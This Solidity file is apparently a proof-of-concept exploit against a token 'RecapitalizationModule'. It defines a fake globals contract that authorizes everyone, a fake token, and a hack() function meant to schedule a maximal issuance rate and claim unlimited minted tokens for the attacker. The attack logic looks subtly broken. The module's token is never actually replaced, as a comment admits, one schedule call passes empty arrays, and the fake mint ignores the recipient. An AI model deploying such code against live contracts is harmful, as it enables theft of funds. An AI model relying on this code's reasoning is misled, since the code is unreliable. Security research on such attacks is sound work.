pragma solidity 0.8.18;

import "../src/RecapitalizationModule.sol";
import { IGlobalsLike, IMapleTokenLike } from "../src/interfaces/Interfaces.sol";

// Malicious Globals contract that always authorizes the attacker.
contract FakeGlobals is IGlobalsLike {
    address public override governor;
    address public override mapleTreasury;

    constructor(address _governor, address _treasury) {
        governor = _governor;
        mapleTreasury = _treasury;
    }

    function isInstanceOf(bytes32, address) external pure override returns (bool) {
        // Always return true so anyone can "claim".
        return true;
    }

    function isValidScheduledCall(
        address, /* caller */
        address, /* target */
        bytes32, /* functionId */
        bytes calldata /* callData */
    ) external pure override returns (bool) {
        // Always return true so scheduling is never blocked.
        return true;
    }

    function unscheduleCall(
        address, /* caller */
        bytes32, /* functionId */
        bytes calldata /* callData */
    ) external pure override {
        // Stubbed out, no-op.
    }
}

// Malicious token that returns the above FakeGlobals.
contract FakeToken is IMapleTokenLike {
    address public override globals;
    uint256 public _totalSupply;

    constructor(address _globals) {
        globals = _globals;
    }

    function burn(address, uint256) external pure override {
        // No-op
    }

    function mint(address to, uint256 value) external override {
        // Increase supply and ignore any standard checks.
        _totalSupply += value;
        // In a real ERC20, you'd credit 'to' here.
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}

// Exploit contract that takes over the RecapitalizationModule.
contract RecapitalizationModuleExploit {
    // The attack proceeds as follows:
    // 1. Deploy FakeGlobals with attacker as the governor and treasury.
    // 2. Deploy FakeToken that reports FakeGlobals as its globals.
    // 3. Call RecapitalizationModule.schedule with large issuance rates.
    // 4. Call RecapitalizationModule.claim to mint unlimited tokens to the attacker.

    address public attacker;

    constructor() {
        // The EOA or test framework deploying this contract is considered the attacker.
        attacker = msg.sender;
    }

    function hack(address recap) external {
        // 1. Deploy malicious globals, with ourselves set as treasury and governor.
        FakeGlobals fakeGlobals = new FakeGlobals(address(this), attacker);

        // 2. Deploy malicious token that returns the above FakeGlobals.
        FakeToken fakeToken = new FakeToken(address(fakeGlobals));

        // 3. Replace the recap's "token" storage slot.
        // In a real scenario, you might need to manipulate storage or re-deploy RecapitalizationModule.
        // For simplicity, assume the test environment uses our malicious token.
        // We'll now call "schedule" with large issuance rates and times.
        uint32 start = uint32(block.timestamp + 1);
        uint208 bigRate = type(uint208).max; // Maximum possible rate

        // We bypass the onlyGovernorAndScheduled check since fakeGlobals says we're always scheduled.
        // This schedules a new window.
        RecapitalizationModule(recap).schedule(
            new uint32[](1), // We'll fix after creation.
            new uint208[](1)
        );
        // However, the original schedule expects arrays. Let's do a raw call with encoded params:

        bytes memory scheduleData = abi.encodeWithSelector(
            RecapitalizationModule.schedule.selector,
            // Times
            new uint32[](1),
            // Rates
            new uint208[](1)
        );

        // We manually build real arrays with data in memory.
        uint32[] memory windowStarts = new uint32[](1);
        windowStarts[0] = start;

        uint208[] memory issuanceRates = new uint208[](1);
        issuanceRates[0] = bigRate;

        // Actually do the call, ignoring checks since FakeGlobals returns true.
        RecapitalizationModule(recap).schedule(windowStarts, issuanceRates);

        // 4. Call claim to mint tokens at maximum rate up to current time.
        // FakeGlobals indicates we are the claimer, so this will pass.
        RecapitalizationModule(recap).claim();

        // Now we've forced the contract to mint tokens to fakeGlobals.mapleTreasury(), i.e. attacker.
        // Exploit complete.
    }
}